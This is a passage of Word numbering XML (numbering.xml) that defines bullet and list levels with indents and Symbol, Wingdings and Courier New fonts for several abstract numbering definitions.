      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="45D2F8B2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="604A7248">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="C0286F88">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="1CBA961E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="774C118E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="BB6A4F56">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="17" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="32942130"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="BEAA2FCE">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="7306257A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="FF5AD414">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="7A020848">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="13FE6E7E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="496C0EF4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="167E4B78">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="C5108DBA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="BAF4BA04">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="18" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="354E2D3E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DCC05EFE"/>
    <w:lvl w:ilvl="0" w:tplc="0FE4ED68">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7D7A4E56">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="CDFA6EA0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="55DEB62C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="2C16CB0E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="8CFC340E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="567C4D88">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="C2920BDC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="19" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="35761CB5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="E07A51EE">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="8F961984">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="2BE4138E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="9CDC1566">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="4FC82320">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="DD28CB88">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="B9CC3ECC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="9814D494">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="C82A8538">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="20" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="37A878C0"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="68DAF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7311D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C55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8F7BBB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="1CE6FAF0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="705022DC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="A170C89A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="33083634">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="CB76F418">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="EB42E04C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="5776B224">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="950214FE">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="AE940D6C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="23" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="3FAA247B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B9825C2C"/>
    <w:lvl w:ilvl="0" w:tplc="7EAAB1D4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="ListParagraph"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="9D843AAA">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="DFE4CE58">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="883E47F4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="DF88DF04">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="25E413EC">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="9C529588">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="180E1E92">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="268047F6">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="24" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="3FB843EE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="13DAF5E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F3120"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9D9A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B73A50"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A060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171E9"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="AF225176">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="90E058E6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="0986D366">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="8B50E004">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="B742F0A4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="512206AA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="17C66F22">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="DF64B4E4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="0C4047AA">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="28" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="528330ED"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="45CAD55E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="1248A94E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="B276CD7A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="57CE06B6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="D4EAA320">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="9DDEDBEC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="676AD8E8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="F1865170">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="B11610B2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="29" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="53C57784"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FFFFFFFF"/>
    <w:lvl w:ilvl="0" w:tplc="A57632E0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
